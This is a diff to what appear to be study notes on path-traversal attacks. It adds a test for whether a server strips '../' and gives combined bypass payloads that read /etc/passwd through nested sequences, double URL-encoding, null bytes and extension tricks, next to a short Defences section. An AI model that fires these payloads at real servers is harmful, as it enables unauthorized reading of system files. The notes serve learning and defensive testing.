@@ -11,6 +11,8 @@
 
 ## Bypass defences
 - elimination (strip):  `../ ` -> `....// `
+  - Test: try to change the orginal request `GET /image?filename=1.jpg` to `GET /image?filename=../1.jpg`
+  - If the file is loaded the code strip ../
 - encode: ` %2e%2e%2f `
 - double-encode: ` %252e%252e%252f `
 - require to start with the expected base folder es. `/var/www/images` -> `filename=/var/www/images/../../../etc/passwd`
@@ -22,6 +24,9 @@
   - GET /image?filename=/etc/passwd ---> "No such file"
     - Try to add null byte
     - Try to add null byte and extension ----> %00.png
+- Combine the cases:
+  - Example: ....//....//....//etc/passwd%00.jpg (strip, double-encode, null byte, whitelist exstension)
+  - %252E%252E%252E%252E%252F%252F%252E%252E%252E%252E%252F%252F%252E%252E%252E%252E%252F%252Fetc%252Fpasswd%252500%252Ejpg
 
 ## Defences
 - Avoid passing user-supplied input to filesystem APIs
